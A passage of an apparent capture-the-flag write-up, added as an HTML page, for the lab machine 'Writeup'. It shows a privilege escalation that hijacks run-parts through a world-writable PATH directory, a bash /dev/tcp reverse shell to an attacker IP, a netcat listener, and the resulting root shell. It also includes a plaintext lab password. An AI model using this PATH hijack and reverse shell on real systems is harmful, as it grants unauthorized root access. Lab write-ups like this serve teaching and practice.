+                /proc/1977/task/1977/fd<br>
+                /proc/1977/fd<br>
+                /proc/1977/map_files<br>
+                /var/local<br>
+                /var/lib/php/sessions<br>
+                /var/tmp<br>
+                /usr/local<br>
+                /usr/local/bin<br>
+                /usr/local/include<br>
+                /usr/local/share<br>
+                /usr/local/share/sgml<br>
+                /usr/local/share/sgml/misc<br>
+                /usr/local/share/sgml/stylesheet<br>
+                /usr/local/share/sgml/entities<br>
+                /usr/local/share/sgml/dtd<br>
+                /usr/local/share/sgml/declaration<br>
+                /usr/local/share/fonts<br>
+                /usr/local/share/man<br>
+                /usr/local/share/emacs<br>
+                /usr/local/share/emacs/site-lisp<br>
+                /usr/local/share/xml<br>
+                /usr/local/share/xml/schema<br>
+                /usr/local/share/xml/misc<br>
+                /usr/local/share/xml/entities<br>
+                /usr/local/share/xml/declaration<br>
+                /usr/local/games<br>
+                /usr/local/src<br>
+                /usr/local/etc<br>
+                /usr/local/lib<br>
+                /usr/local/lib/python3.5<br>
+                /usr/local/lib/python3.5/dist-packages<br>
+                /usr/local/lib/python2.7<br>
+                /usr/local/lib/python2.7/dist-packages<br>
+                /usr/local/lib/python2.7/site-packages<br>
+                /usr/local/sbin<br>
+                /run/user/1000<br>
+                /run/shm<br>
+                /run/lock<br>
+                /home/jkr<br>
+                /tmp
+            </div>
+        </div><br>
+        <br>
+        Two of the directories in the PATH variable are world-writable! We can write to either:<br>
+        • <code>/usr/local/sbin</code><br>
+        • or <code>/usr/local/bin</code><br>
+        <br>
+        <strong>*Note about the PATH variable</strong><br>
+        One thing to note about the PATH variable is that the system will search through the directories in PATH in the order that they're listed.<br>
+        <br>
+        That is, a PATH of <code>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code> will tell the system to:<br>
+        • first look in <code>/usr/local/sbin</code><br>
+        • then <code>/usr/local/bin</code><br>
+        • then <code>/usr/sbin</code><br>
+        • etc.<br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>7) Create own version of <em>run-parts</em> &amp; get shell</strong></h2><br>
+        <code>run-parts</code> is the command that's being run by :<br>
+        <code>sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new</code><br>
+        <br>
+        The <code>run-parts</code> command is currently located in <code>/bin/run-parts</code><br>
+            <div class="codebox">
+                jkr@writeup:~$&nbsp;which&nbsp;run-parts<br>
+                /bin/run-parts
+            </div>
+        </div><br>
+        <br>
+        The <code>/bin</code> directory is last on the list on the PATH variable, whereas <code>/usr/local/sbin</code> is first<br>
+            <div class="codebox">
+                PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+            </div>
+        </div><br>
+        <br>
+        This means that if we place our own version of the <code>run-parts</code> command inside <code>/usr/local/sbin</code>, our malicious version will be found first and we'll have code execution as root whenever a user ssh's into the box.<br>
+        <br>
+        Knowing this, the solution that came to me to get root was to create a reverse shell.<br>
+            <div class="codebox">
+                jkr@writeup:~$&nbsp;which&nbsp;nc<br>
+                jkr@writeup:~$&nbsp;which&nbsp;bash<br>
+                /bin/bash
+            </div>
+        </div><br>
+        <br>
+        <code>netcat</code> isn't available so we'll have to use <code>bash</code> instead.<br>
+        Write the reverse shell into <code>/usr/local/sbin/run-parts</code> and make the shell script executable.<br>
+            <div class="codebox">
+                jkr@writeup:~$&nbsp;nano&nbsp;/usr/local/sbin/run-parts<br>
+                #!/bin/bash<br>
+                bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/10.10.14.11/9001&nbsp;0&gt;&amp;1<br>
+                jkr@writeup:~$&nbsp;chmod&nbsp;+x&nbsp;/usr/local/sbin/run-parts<br>
+                jkr@writeup:~$&nbsp;ls&nbsp;-l&nbsp;/usr/local/sbin/run-parts<br>
+                -rwxr-xr-x&nbsp;1&nbsp;jkr&nbsp;staff&nbsp;32&nbsp;Jun&nbsp;26&nbsp;12:22&nbsp;/usr/local/sbin/run-parts
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your attacking machine<br>
+            <div class="codebox">
+                root@gotham:~/ctf/writeup#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And SSH into <em>Writeup</em> on a separate terminal to trigger your malicious <code>run-parts</code> reverse shell to run.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/writeup#&nbsp;ssh&nbsp;jkr@10.10.10.138<br>
+                jkr@10.10.10.138's&nbsp;password:&nbsp;raykayjay9<br>
+                ....
+            </div>
+        </div><br>
+        <br>
+        The SSH login should hang and you'll receive a root shell on your listener :)<br>
+            <div class="codebox">
+                ...<br>
+                connect&nbsp;to&nbsp;[10.10.14.11]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.138]&nbsp;34278<br>
+                bash:&nbsp;cannot&nbsp;set&nbsp;terminal&nbsp;process&nbsp;group&nbsp;(2068):&nbsp;Inappropriate&nbsp;ioctl&nbsp;for&nbsp;device<br>
+                bash:&nbsp;no&nbsp;job&nbsp;control&nbsp;in&nbsp;this&nbsp;shell<br>
+                root@writeup:/#&nbsp;id<br>
+                id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br>
+                root@writeup:/#&nbsp;pwd<br>
+                pwd<br>
+                /<br>
+                root@writeup:/#&nbsp;cat&nbsp;~/root.txt<br>
+                cat&nbsp;~/root.txt<br>
+                eeba4...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
